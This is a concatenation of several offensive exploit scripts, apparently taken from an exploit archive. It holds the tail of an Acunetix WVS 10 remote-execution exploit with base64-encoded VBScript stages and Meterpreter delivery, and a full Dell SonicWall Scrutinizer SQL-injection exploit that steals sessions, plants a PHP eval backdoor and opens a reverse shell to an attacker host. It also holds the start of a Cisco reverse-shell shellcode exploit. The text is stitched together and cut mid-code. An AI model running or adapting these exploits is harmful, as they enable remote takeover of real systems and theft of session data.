             "E4MHB4Ow0KICBib3gtc2hhZG93OiAwcHggNHB4IDBweCAjN2U3ZTdlDQp9DQoNCi5pbm5lci1zY3JlZW57DQogIHdpZHRoOiA4MDBwe" \
             "DsNCiAgaGVpZ2h0OiAzNDBweDsNCiAgYmFja2dyb3VuZDogIzFhYmM5ZDsNCiAgbWFyZ2luOiAwcHggYXV0bzsNCiAgcGFkZGluZy10" \
             "b3A6IDgwcHg7DQp9DQoNCi5mb3Jtew0KICB3aWR0aDogNDAwcHg7DQogIGhlaWdodDogMjMwcHg7DQogIGJhY2tncm91bmQ6ICNlZGV" \
             "mZjE7DQogIG1hcmdpbjogMHB4IGF1dG87DQogIHBhZGRpbmctdG9wOiAyMHB4Ow0KICBib3JkZXItcmFkaXVzOiAxMHB4Ow0KICAtbW" \
             "96LWJvcmRlci1yYWRpdXM6IDEwcHg7DQogIC13ZWJraXQtYm9yZGVyLXJhZGl1czogMTBweDsNCn0NCg0KaW5wdXRbdHlwZT0idGV4d" \
             "CJdew0KICBkaXNwbGF5OiBibG9jazsNCiAgd2lkdGg6IDMwOXB4Ow0KICBoZWlnaHQ6IDM1cHg7DQogIG1hcmdpbjogMTVweCBhdXRv" \
             "Ow0KICBiYWNrZ3JvdW5kOiAjZmZmOw0KICBib3JkZXI6IDBweDsNCiAgcGFkZGluZzogNXB4Ow0KICBmb250LXNpemU6IDE2cHg7DQo" \
             "gICBib3JkZXI6IDJweCBzb2xpZCAjZmZmOw0KICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOw0KICBib3JkZXItcmFkaXVzOiA1cH" \
             "g7DQogIC1tb3otYm9yZGVyLXJhZGl1czogNXB4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDVweDsNCn0NCg0KaW5wdXRbdHlwZ" \
             "T0idGV4dCJdOmZvY3Vzew0KICBib3JkZXI6IDJweCBzb2xpZCAjMWFiYzlkDQp9DQoNCmlucHV0W3R5cGU9InN1Ym1pdCJdew0KICBk" \
             "aXNwbGF5OiBibG9jazsNCiAgYmFja2dyb3VuZDogIzFhYmM5ZDsNCiAgd2lkdGg6IDMxNHB4Ow0KICBwYWRkaW5nOiAxMnB4Ow0KICB" \
             "jdXJzb3I6IHBvaW50ZXI7DQogIGNvbG9yOiAjZmZmOw0KICBib3JkZXI6IDBweDsNCiAgbWFyZ2luOiBhdXRvOw0KICBib3JkZXItcm" \
             "FkaXVzOiA1cHg7DQogIC1tb3otYm9yZGVyLXJhZGl1czogNXB4Ow0KICAtd2Via2l0LWJvcmRlci1yYWRpdXM6IDVweDsNCiAgZm9u" \
             "dC1zaXplOiAxN3B4Ow0KICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOw0KfQ0KDQppbnB1dFt0eXBlPSJzdWJtaXQiXTpob3ZlcnsN" \
             "CiAgYmFja2dyb3VuZDogIzA5Y2NhNg0KfQ0KDQphew0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQogIGZvbnQtZmFtaWx5OiBBcmlhbDs" \
             "NCiAgY29sb3I6IGdyYXk7DQogIGRpc3BsYXk6IGJsb2NrOw0KICBtYXJnaW46IDE1cHggYXV0bzsNCiAgdGV4dC1kZWNvcmF0aW9uOi" \
             "Bub25lOw0KICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBlYXNlOw0KICBmb250LXNpemU6IDEycHg7DQp9DQoNCmE6aG92ZXJ7DQogIGNvb" \
             "G9yOiAjMWFiYzlkOw0KfQ0KDQoNCjo6LXdlYmtpdC1pbnB1dC1wbGFjZWhvbGRlciB7DQogICBjb2xvcjogZ3JheTsNCn0NCg0KOi1" \
             "tb3otcGxhY2Vob2xkZXIgeyAvKiBGaXJlZm94IDE4LSAqLw0KICAgY29sb3I6IGdyYXk7ICANCn0NCg0KOjotbW96LXBsYWNlaG9sZG" \
             "VyIHsgIC8qIEZpcmVmb3ggMTkrICovDQogICBjb2xvcjogZ3JheTsgIA0KfQ0KDQo6LW1zLWlucHV0LXBsYWNlaG9sZGVyIHsgIA0KI" \
             "CAgY29sb3I6IGdyYXk7ICANCn0NCjwvc3R5bGU+DQo8aDE+QWRtaW4gcGFuZWw8L2gxPg0KPGRpdiBjbGFzcz0ic3RhbmQiPg0KICA8" \
             "ZGl2IGNsYXNzPSJvdXRlci1zY3JlZW4iPg0KICAgIDxkaXYgY2xhc3M9ImlubmVyLXNjcmVlbiI+DQogICAgICA8ZGl2IGNsYXNzPSJ" \
             "mb3JtIj4NCiAgICAgIDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIvbG9naW4iPg0KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dC" \
             "IgbmFtZT0idXNyIiBwbGFjZWhvbGRlcj0iVXNlcm5hbWUiIC8+DQogICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJwd2QiI" \
             "HBsYWNlaG9sZGVyPSJQYXNzd29yZCIgLz4NCiAgICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiIgLz4NCiAg" \
             "ICAgICAgIDwvZm9ybT4NCiAgICAgICAgPGEgaHJlZj0iL2ZvcmdvdCI+TG9zdCB5b3VyIHBhc3N3b3JkPzwvYT4NCiAgICAgIDwvZGl" \
             "2PiANCiAgICA8L2Rpdj4gDQogIDwvZGl2PiANCjwvZGl2Pg=="

# param NO
EXPLOIT_STAGE_2 = "U2V0IGZzbyA9IENyZWF0ZU9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKQ0KRnVuY3Rpb24gRXNjYWxhdGVBbm" \
                  "RFeGVjdXRlKCkNCiAgYmluZCA9ICJTZXQgb2JqID0gQ3JlYXRlT2JqZWN0KCIiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3Q" \
                  "iIikiICYgdmJjcmxmICZfDQogICJvYmouRGVsZXRlRmlsZSgiIkM6XFByb2dyYW1EYXRhXEFjdW5ldGl4IFdWUyAxMFxEYXRhX" \
                  "FNjcmlwdHNcUGVyU2VydmVyXEFKUF9BdWRpdC5zY3JpcHQiIikiICYgdmJjcmxmICZfDQogICAib2JqLk1vdmVGaWxlICIiQzp" \
                  "cUHJvZ3JhbURhdGFcQWN1bmV0aXggV1ZTIDEwXERhdGFcU2NyaXB0c1xQZXJTZXJ2ZXJcQUpQX0F1ZGl0LnNjcmlwdC5iYWsiI" \
                  "iwgIiJDOlxQcm9ncmFtRGF0YVxBY3VuZXRpeCBXVlMgMTBcRGF0YVxTY3JpcHRzXFBlclNlcnZlclxBSlBfQXVkaXQuc2NyaXB" \
                  "0IiIgIiAmIHZiY3JsZiAmXw0KICAiRnVuY3Rpb24gUkVPbnJZSmUoKSIgJiB2YmNybGYgJl8NCiAgIk5tU1ROUFVyb0lLdFRxID" \
                  "0gIiIlcyIiIiAmIHZiY3JsZiAmXw0KICAiRGltIGdVdERzem1uR050IiAmIHZiQ3JsZiAmXw0KICAiU2V0IGdVdERzem1uR050I" \
                  "D0gQ3JlYXRlT2JqZWN0KCIiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiIikiICYgdmJjcmxmICZfDQogICJEaW0gaE1XRkN" \
                  "6dUciICYgdmJjcmxmICZfDQogICJEaW0gZXJtbVRDalJ4SWpjWEciICYgdmJjcmxmICZfDQogICJEaW0ga0xrdVdOYnhuTFVIe" \
                  "HR6IiAmIHZiY3JsZiAmXw0KICAiRGltIHJDUWNUekFBalJ4dSIgJiB2YmNybGYgJl8NCiAgIlNldCBlcm1tVENqUnhJamNYRyA" \
                  "9IGdVdERzem1uR050LkdldFNwZWNpYWxGb2xkZXIoMikiICYgdmJjcmxmICZfDQogICJyQ1FjVHpBQWpSeHUgPSBlcm1tVENqU" \
                  "nhJamNYRyAmICIiXCIiICYgZ1V0RHN6bW5HTnQuR2V0VGVtcE5hbWUoKSIgJiB2YmNybGYgJl8NCiAgImdVdERzem1uR050LkN" \
                  "yZWF0ZUZvbGRlcihyQ1FjVHpBQWpSeHUpIiAmIHZiY3JsZiAmXw0KICAia0xrdVdOYnhuTFVIeHR6ID0gckNRY1R6QUFqUnh1I" \
                  "CYgIiJcIiIgJiAiIk5ObWxmVmhqYld3emNqLmV4ZSIiIiAmIHZiY3JsZiAmXw0KICAiU2V0IGhNV0ZDenVHID0gZ1V0RHN6bW5" \
                  "HTnQuQ3JlYXRlVGV4dEZpbGUoa0xrdVdOYnhuTFVIeHR6LCB0cnVlICwgZmFsc2UpICIgJiB2YmNybGYgJl8NCiAgIkZvciBpI" \
                  "D0gMSB0byBMZW4oTm1TVE5QVXJvSUt0VHEpIFN0ZXAgMiIgJiB2YmNybGYgJl8NCiAgIiAgICBoTVdGQ3p1Ry5Xcml0ZSBDaHI" \
                  "oQ0xuZygiIiZIIiIgJiBNaWQoTm1TVE5QVXJvSUt0VHEsaSwyKSkpIiAmIHZiY3JsZiAmXw0KICAiTmV4dCIgJiB2YmNybGYgJ" \
                  "l8NCiAgImhNV0ZDenVHLkNsb3NlIiAmIHZiY3JsZiAmXw0KICAiRGltIHlFU3pGdUlNb211IiAmIHZiY3JsZiAmXw0KICAiU2V" \
                  "0IHlFU3pGdUlNb211ID0gQ3JlYXRlT2JqZWN0KCIiV3NjcmlwdC5TaGVsbCIiKSIgJiB2YmNybGYgJl8NCiAgInlFU3pGdUlNb" \
                  "211LnJ1biBrTGt1V05ieG5MVUh4dHoiICYgdmJjcmxmICZfDQogICInZ1V0RHN6bW5HTnQuRGVsZXRlRmlsZShrTGt1V05ieG5" \
                  "MVUh4dHopIiAmIHZiY3JsZiAmXw0KICAiJ2dVdERzem1uR050LkRlbGV0ZUZvbGRlcihyQ1FjVHpBQWpSeHUpIiAmIHZiY3JsZ" \
                  "iAmXw0KIkVuZCBGdW5jdGlvbiIgJiB2YmNybGYgJl8NCiJSRU9ucllKZSIgJiB2YmNybGYgJl8NCiJDcmVhdGVPYmplY3QoIiJ" \
                  "TY3JpcHRpbmcuRmlsZVN5c3RlbU9iamVjdCIiKS5EZWxldGVGaWxlIFdTY3JpcHQuU2NyaXB0RnVsbE5hbWUiICYgdmJjcmxmI" \
                  "CZfDQoiV1NjcmlwdC5RdWl0Ig0KICBjd2QgPSBDcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKS5FeHBhbmRFbnZpcm9ubWV" \
                  "udFN0cmluZ3MoIiVzIikgJiAiXHN0YWdlbGFzdC52YnMiDQogIFNldCBvYmpGaWxlQmluZCA9IGZzby5DcmVhdGVUZXh0RmlsZS" \
                  "hjd2QgLFRydWUpDQogIG9iakZpbGVCaW5kLldyaXRlIGJpbmQgJiB2YkNyTGYNCiAgb2JqRmlsZUJpbmQuQ2xvc2UNCiAgDQog" \
                  "IGpzID0gInZhciBzaGVsbCA9IG5ldyBBY3RpdmVYT2JqZWN0KCIiV1NjcmlwdC5TaGVsbCIiKTsiJiB2YmNybGYgJiAic2hlbG" \
                  "wucnVuKCdjbWQgL0Mgc3RhcnQgL0IgIiIiIiAiInBvd2Vyc2hlbGwiIiAtd2luZG93c3R5bGUgaGlkZGVuIC1jb21tYW5kICIi" \
                  "d3NjcmlwdCAiICYgUmVwbGFjZShjd2QsIlwiLCJcXCIpICYgIiIiJyk7Ig0KICBmc28uTW92ZUZpbGUgIkM6XFByb2dyYW1EYX" \
                  "RhXEFjdW5ldGl4IFdWUyAxMFxEYXRhXFNjcmlwdHNcUGVyU2VydmVyXEFKUF9BdWRpdC5zY3JpcHQiLCAiQzpcUHJvZ3JhbURh" \
                  "dGFcQWN1bmV0aXggV1ZTIDEwXERhdGFcU2NyaXB0c1xQZXJTZXJ2ZXJcQUpQX0F1ZGl0LnNjcmlwdC5iYWsiDQogIFNldCBvYm" \
                  "pGaWxlID0gZnNvLkNyZWF0ZVRleHRGaWxlKCJDOlxQcm9ncmFtRGF0YVxBY3VuZXRpeCBXVlMgMTBcRGF0YVxTY3JpcHRzXFBl" \
                  "clNlcnZlclxBSlBfQXVkaXQuc2NyaXB0IixUcnVlKQ0KICBvYmpGaWxlLldyaXRlIGpzICYgdmJDckxmDQogIG9iakZpbGUuQ2" \
                  "xvc2UNCiAgeSA9IE1vbnRoKE5vdykgJiAiLyIgJiBEYXkoTm93KSAmICIvIiAmIFllYXIoTm93KQ0KICBoID0gSG91cihOb3cp" \
                  "ICYgIjoiJiBNaW51dGUoTm93KSsxDQogIHNSZXF1ZXN0ID0gInsiInNjYW5UeXBlIiI6IiJzY2FuIiIsIiJ0YXJnZXRMaXN0Ii" \
                  "I6IiIiIiwiInRhcmdldCIiOlsiImh0dHA6Ly93d3cuZ29vZ2xlLml0IiJdLCIicmVjdXJzZSIiOiIiLTEiIiwiImRhdGUiIjoi" \
                  "IiIgJiB5ICYgIiIiLCIiZGF5T2ZXZWVrIiI6IiIxIiIsIiJkYXlPZk1vbnRoIiI6IiIxIiIsIiJ0aW1lIiI6IiIiICYgaCAmIC" \
                  "IiIiwiImRlbGV0ZUFmdGVyQ29tcGxldGlvbiIiOiIiRmFsc2UiIiwiInBhcmFtcyIiOnsiInByb2ZpbGUiIjoiIkRlZmF1bHQi" \
                  "IiwiImxvZ2luU2VxIiI6IiI8bm9uZT4iIiwiInNldHRpbmdzIiI6IiJEZWZhdWx0IiIsIiJzY2FubmluZ21vZGUiIjoiImhldX" \
                  "Jpc3RpYyIiLCIiZXhjbHVkZWRob3VycyIiOiIiPG5vbmU+IiIsIiJzYXZldG9kYXRhYmFzZSIiOiIiVHJ1ZSIiLCIic2F2ZWxv" \
                  "Z3MiIjoiIkZhbHNlIiIsIiJnZW5lcmF0ZXJlcG9ydCIiOiIiRmFsc2UiIiwiInJlcG9ydGZvcm1hdCIiOiIiUERGIiIsIiJyZX" \
                  "BvcnR0ZW1wbGF0ZSIiOiIiV1ZTRGV2ZWxvcGVyUmVwb3J0LnJlcCIiLCIiZW1haWxhZGRyZXNzIiI6IiIiIn19Ig0KICBzZXQg" \
                  "b0hUVFAgPSBDcmVhdGVPYmplY3QoIk1pY3Jvc29mdC5YTUxIVFRQIikNCiAgb0hUVFAub3BlbiAiUE9TVCIsICJodHRwOi8vMT" \
                  "I3LjAuMC4xOjgxODMvYXBpL2FkZFNjYW4iLCBmYWxzZQ0KICBvSFRUUC5zZXRSZXF1ZXN0SGVhZGVyICJDb250ZW50LVR5cGUi" \
                  "LCAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkIg0KICBvSFRUUC5zZXRSZXF1ZXN0SGVhZGVyICJYLVJlcXVlc3" \
                  "RlZC1XaXRoIiwgIlhNTEh0dHBSZXF1ZXN0Ig0KICBvSFRUUC5zZXRSZXF1ZXN0SGVhZGVyICJBY2NlcHQiLCAiYXBwbGljYXRp" \
                  "b24vanNvbiwgdGV4dC9qYXZhc2NyaXB0LCAqLyo7IHE9MC4wMSINCiAgb0hUVFAuc2V0UmVxdWVzdEhlYWRlciAiQ29udGVudC" \
                  "1UeXBlIiwgImFwcGxpY2F0aW9uL2pzb247IGNoYXJzZXQ9VVRGLTgiDQogIG9IVFRQLnNldFJlcXVlc3RIZWFkZXIgIlJlcXVl" \
                  "c3RWYWxpZGF0ZWQiLCAgInRydWUiDQogIG9IVFRQLnNldFJlcXVlc3RIZWFkZXIgIkNvbnRlbnQtTGVuZ3RoIiwgTGVuKHNSZX" \
                  "F1ZXN0KQ0KICBvSFRUUC5zZW5kIHNSZXF1ZXN0DQogRW5kIEZ1bmN0aW9uDQogDQogRXNjYWxhdGVBbmRFeGVjdXRlDQogZnNv" \
                  "LkRlbGV0ZUZpbGUgV1NjcmlwdC5TY3JpcHRGdWxsTmFtZQ0KIFdTY3JpcHQuUXVpdA=="


class myHandler(BaseHTTPRequestHandler):
    timeout = 5
    server_version = "Apache"
    sys_version = "1.2"

    def log_message(self, format, *args):
        try:
            paths = str(list(args)[0])
            if "prompt" in paths or "confirm" in paths or "alert" in paths:
                print "[*] Triggering EXPLOIT_STAGE_1 + PAYLOAD_DOWNLOAD_EXEC sending (%s) bytes !" % \
                      (len(PAYLOAD_DOWNLOAD_EXEC) + len(EXPLOIT_STAGE_1))
            if "stage2" in paths:
                print "[*] Triggering EXPLOIT_STAGE_2 sending (%s) bytes !" % len(EXPLOIT_STAGE_2)
            return
        except:
            pass
            return

    def do_POST(self):
        PDE = base64.b64decode(PAYLOAD_DOWNLOAD_EXEC) % (sys.argv[2] + ":" + sys.argv[1],
                                                                 "%TEMP%", gen_random_name(12))
        data = self.rfile.read(int(self.headers.getheader("Content-Length")))
        data = data.split("&")
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        for param in data:
            if "usr" in param:
                param = param.split("=")[1]
                self.wfile.write(base64.b64decode(EXPLOIT_STAGE_1)
                                 % (base64.b64encode("".join(x + "\x00" for x in PDE)),
                                    ("Bad password for user %s , <a href=\"/\">try again</a>." % param)))
                return
        self.wfile.write(base64.b64decode(EXPLOIT_STAGE_1)
                                 % (base64.b64encode("".join(x + "\x00" for x in PDE)),
                                    "Some data are missing , <a href=\"/\">try again</a>."))
        return

    def do_GET(self):
        try:
            if self.path == "/":
                self.send_response(302)
                self.send_header('Content-type', 'text/html')
                self.send_header('Location', "login")
                self.end_headers()
                # Send the html message
                self.wfile.write("<a href='/?url=test'>Here</a>")
                return
            elif self.path == "/stage2":
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                # Send the html message
                self.wfile.write(base64.b64decode(EXPLOIT_STAGE_2)
                                 % (PAYLOAD_METERPETRER % ip2b(sys.argv[2]), "%TEMP%"))
                postexpthread = Thread(target=postexploitation, args=(self.client_address[0], ))
                postexpthread.start()
                return
            else:
                string = ""
                try:
                    string = self.path.split("=")[1]
                except:
                    pass
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                # Send the html message
                PDE = base64.b64decode(PAYLOAD_DOWNLOAD_EXEC) % (sys.argv[2] + ":" + sys.argv[1],
                                                                 "%TEMP%", gen_random_name(12))
                self.wfile.write(base64.b64decode(EXPLOIT_STAGE_1)
                                 % (base64.b64encode("".join(x + "\x00" for x in PDE)), base64.b64decode(LOGIN_FORM)))
                return
        except Exception as e:
            print e.message
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write("")
            return

if __name__ == "__main__":
    print "\n\nAcunetix WVS 10 - SYSTEM Remote Command Execution (Daniele Linguaglossa)\n" \
          "Payload: Meterpreter reverse TCP 4444"
    try:
        if len(sys.argv) > 2:
            # Create a web server and define the handler to manage the
            # incoming request
            server = HTTPServer(('0.0.0.0', int(sys.argv[1])), myHandler)
            print 'Exploit started on port *:%s' % sys.argv[1]
            print '[+] Waiting for scanner...'

            # Wait forever for incoming http requests
            server.serve_forever()
        else:
            print "Usage: %s <port> <local ip/domain name>" % os.path.basename(sys.argv[0])

    except KeyboardInterrupt:
        print '^C received, shutting down the web server'
        server.socket.close()
#!/usr/local/bin/python
"""
Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQL Injection Remote Code Execution
sonic.py by mr_me@offensive-security.com
greets to @brandonprry ;->

Summary:
========

This exploits an pre-auth SQL Injection in the login.php script within an update statement to steal session data. You could also steal login creds 
which require absolutely no hash cracking since the target uses symmetric encryption. It then exploits a second post-auth SQL Injection vulnerability 
that writes a shell to the target using a relative path and gets SYSTEM.

Vulnerability:
==============

In html/d4d/login.php on lines 27-34:

    }else if ($_REQUEST['setSkin']){
        echo setUserSkin(
          array(
            'db' => $db,
            'user_id' => $_REQUEST['user_id'],
            'skin' => $_REQUEST['setSkin']
          )
        );

 Then, on lines 46-62:

 function setUserSkin($args){
    $db = $args['db'];
    
    $result = $db->query("
UPDATE plixer.userpreferences
SET setting = '$args[skin]'
WHERE prefCode = 'skin'
AND users_id = $args[user_id]");
    
    if ($args['user_id'] == 1){
        $result2 = $db->query("
UPDATE plixer.serverprefs
SET currentVal = '$args[skin]'
WHERE langKey = 'skin'");
    }
    
}

For the post-auth bug, see https://gist.github.com/brandonprry/76741d9a0d4f518fe297

Example:
========

saturn:module-03 mr_me$ ./sonic.py

	Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t
	mr_me@offensive-security.com

(!) usage: ./poc.py <target> <connectback:port>
saturn:module-03 mr_me$ ./poc.py 172.16.175.147 172.16.175.1:1111

	Dell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t
	mr_me@offensive-security.com

(+) target is vuln, proceeding
(+) waiting for session data... starting at: 2016-05-06 16:31:37.022818
(+) awesome, appears like someone has logged in... 
(+) it took 0:00:05.020670 to detect valid session data
(+) extracting session data... 1:NfS5yetP49TXCqP5
(+) backdooring target...
(+) starting handler on port 1111
(+) connection from 172.16.175.147
(+) pop thy shell!
whoami
nt authority\system
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . : localdomain
   IP Address. . . . . . . . . . . . : 172.16.175.147
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.175.2
*** Connection closed by remote host ***
"""
import re
import sys
import requests
import datetime
import socket
import telnetlib
import email.utils as eut
from threading import Thread
from base64 import b64encode as b64e

lower_value = 0
upper_value = 126

def banner():
	return """\n\tDell SonicWall Scrutinizer <= 11.0.1 setUserSkin/deleteTab SQLi Explo!t\n\tmr_me@offensive-security.com\n"""

def ct():
	return datetime.datetime.now()

def parsedate(text):
    return datetime.datetime(*eut.parsedate(text)[:6])

def check_args():
    global target, lserver, lport
    if len(sys.argv) < 3:
        return False
    cb = sys.argv[2]
    target = "http://%s" % sys.argv[1]
    if not ":" in cb:
    	return False
    if not cb.split(":")[1].isdigit():
    	return False
    lserver = cb.split(":")[0]
    lport   = int(cb.split(":")[1])
    return True

def validate():
    r = requests.get("%s/index.html" % target)
    if re.search('Scrutinizer 11.0.1', r.text):
        return True
    return False

def have_sessions(time):
    """
    check if we have sessions
    """   	
    sqli = "if(ascii(substring((select count(session_id) from sessions),1,1))!=48,sleep(%s),null)" % (time)
    url = "d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s" % sqli
    st = ct()
    r = requests.get("%s/%s" % (target, url))
    delta = ct()-st
    if int(delta.seconds) < time:
        return False
    return True

def do_time_based_blind(sql, time):
    lower = lower_value
    upper = upper_value
    while lower < upper:
        try:
            mid = (lower + upper) / 2
            url = "%s/%s" % (target, ("%s>%s,sleep(%s),null)" % (sql, str(mid), time)))
            st = ct()
            r = requests.get(url)
            delta = ct()-st
            if int(delta.seconds) >= time:
                lower = mid + 1
            else:
                upper = mid
        except (KeyboardInterrupt, SystemExit):
            raise
        except:
            pass
 
    if lower > lower_value and lower < upper_value:
        value = lower
    else:
        url = "%s/%s" % (target, ("%s=%s,sleep(%s),null)" % (sql, str(lower), time)))
        st = ct()
        r = requests.get(url)
        delta = ct()-st
        if int(delta.seconds) >= time:
            value = lower
    return value

def steal_session_length():
    xlen = ""
    sqli    = "if(ascii(substring((select length(length(concat(user_id,0x3a,session_id))) from sessions limit 0,1),1,1))"
    qry_str = "d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s" % sqli
    zlen = int(chr(do_time_based_blind(qry_str, 5)))
    for i in range(0, zlen):
        sqli = "if(ascii(substring((select length(concat(user_id,0x3a,session_id)) from sessions limit 0,1),%d,1))" % (i+1)
        qry_str = "d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s" % sqli
        xlen += chr(do_time_based_blind(qry_str, 5))
    return int(xlen)

def steal_session(length, time):
    session = ""
    for i in range(0, length):
        sqli    = "if(ascii(substring((select concat(user_id,0x3a,session_id) from sessions limit 0,1),%d,1))" % (i+1)
        qry_str = "d4d/login.php?setSkin=1&user_id=setSkin=1&user_id=%s" % sqli
        char = chr(do_time_based_blind(qry_str, 5))
    	session += char
    	sys.stdout.write(char)
    	sys.stdout.flush() 
    return session

# build the reverse php shell
def build_php_code():
    phpkode  = ("""
    @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);""")
    phpkode += ("""$dis=@ini_get('disable_functions');""")
    phpkode += ("""if(!empty($dis)){$dis=preg_replace('/[, ]+/', ',', $dis);$dis=explode(',', $dis);""")
    phpkode += ("""$dis=array_map('trim', $dis);}else{$dis=array();} """)
    phpkode += ("""if(!function_exists('LcNIcoB')){function LcNIcoB($c){ """)
    phpkode += ("""global $dis;if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {$c=$c." 2>&1\\n";} """)
    phpkode += ("""$imARhD='is_callable';$kqqI='in_array';""")
    phpkode += ("""if($imARhD('popen')and!$kqqI('popen',$dis)){$fp=popen($c,'r');""")
    phpkode += ("""$o=NULL;if(is_resource($fp)){while(!feof($fp)){ """)
    phpkode += ("""$o.=fread($fp,1024);}}@pclose($fp);}else""")
    phpkode += ("""if($imARhD('proc_open')and!$kqqI('proc_open',$dis)){ """)
    phpkode += ("""$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); """)
    phpkode += ("""$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);} """)
    phpkode += ("""@proc_close($handle);}else if($imARhD('system')and!$kqqI('system',$dis)){ """)
    phpkode += ("""ob_start();system($c);$o=ob_get_contents();ob_end_clean(); """)
    phpkode += ("""}else if($imARhD('passthru')and!$kqqI('passthru',$dis)){ob_start();passthru($c); """)
    phpkode += ("""$o=ob_get_contents();ob_end_clean(); """)
    phpkode += ("""}else if($imARhD('shell_exec')and!$kqqI('shell_exec',$dis)){ """)
    phpkode += ("""$o=shell_exec($c);}else if($imARhD('exec')and!$kqqI('exec',$dis)){ """)
    phpkode += ("""$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else{$o=0;}return $o;}} """)
    phpkode += ("""$nofuncs='no exec functions'; """)
    phpkode += ("""if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ """)
    phpkode += ("""$s=@fsockopen('tcp://%s','%d');while($c=fread($s,2048)){$out = ''; """ % (lserver, lport))
    phpkode += ("""if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
    phpkode += ("""}elseif (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'){break;}else{ """)
    phpkode += ("""$out=LcNIcoB(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs); """)
    phpkode += ("""break;}}fwrite($s,$out);}fclose($s);}else{ """)
    phpkode += ("""$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,'%s','%d'); """ % (lserver, lport))
    phpkode += ("""@socket_write($s,"socket_create");while($c=@socket_read($s,2048)){ """)
    phpkode += ("""$out = '';if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
    phpkode += ("""} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { """)
    phpkode += ("""break;}else{$out=LcNIcoB(substr($c,0,-1));if($out===false){ """)
    phpkode += ("""@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out)); """)
    phpkode += ("""}@socket_close($s);} """)
    return phpkode

def kill_shot(stolen_data):
    user_id    = stolen_data.split(":")[0]
    sessionid = stolen_data.split(":")[1]
    url = "d4d/dashboards.php?deleteTab=1 union select '<?php eval(base64_decode($_COOKIE[\\'awae\\'])); ?>' into outfile '../../html/d4d/offsec.php'"
    requests.get("%s/%s" % (target, url), cookies={"userid": user_id, "sessionid": sessionid})

def exec_code():
    phpkodez = b64e(build_php_code())
    handlerthr = Thread(target=handler, args=(lport,))
    handlerthr.start()
    requests.get("%s/d4d/offsec.php" % (target), cookies={"awae": phpkodez})

def handler(lport):
    print "(+) starting handler on port %d" % lport
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lport))
    s.listen(1)
    conn, addr = s.accept()
    print "(+) connection from %s" % addr[0]
    t.sock = conn
    print "(+) pop thy shell!"
    t.interact()

def main():
    if check_args():
        if validate():
            print "(+) target is vuln, proceeding"
            st = ct()
            print "(+) waiting for session data... starting at: %s" % ct()
            # we dont use recursion since we could get stack exhaustion. 
            while not have_sessions(5):
            	pass
            print "(+) awesome, appears like someone has logged in... "
            print "(+) it took %s to detect valid session data" % (ct()-st)
            sys.stdout.flush() 
            sys.stdout.write("(+) extracting session data... ")
            dataz = steal_session(steal_session_length(), 5)
            print "\n(+) backdooring target..."
            kill_shot(dataz)
            exec_code()
    else:
    	print "(!) usage: %s <target> <connectback:port>" % sys.argv[0]

if __name__ == "__main__":
    print banner()
    main()#!/usr/bin/env python2.7

import socket
import sys
import struct
import string
import random
import time



# Spawns a reverse cisco CLI
cliShellcode = (
    "\x60\xc7\x02\x90\x67\xb9\x09\x8b\x45\xf8\x8b\x40\x5c\x8b\x40\x04"
    "\x8b\x40\x08\x8b\x40\x04\x8b\x00\x85\xc0\x74\x3b\x50\x8b\x40\x08"
    "\x8b\x40\x04\x8d\x98\xd8\x00\x00\x00\x58\x81\x3b\xd0\xd4\x00\xe1"
    "\x75\xe4\x83\x7b\x04\x31\x74\xde\x89\xd8\x2d\x00\x01\x00\x00\xc7"
    "\x40\x04\x03\x01\x00\x00\xc7\x40\x0c\xd0\x00\x00\x00\xc7\x80\xf8"
    "\x00\x00\x00\xef\xcd\x1c\xa1\x55\x31\xed\x31\xff\x4f\xbe\x22\x00"
    "\x00\x00\xba\x07\x00\x00\x00\xb9\x00\x10\x00\x00\x31\xdb\xb8\xc0"
    "\x00\x00\x00\xcd\x80\x5d\x89\xc7\xeb\x26\x5e\xb9\x00\x04\x00\x00"
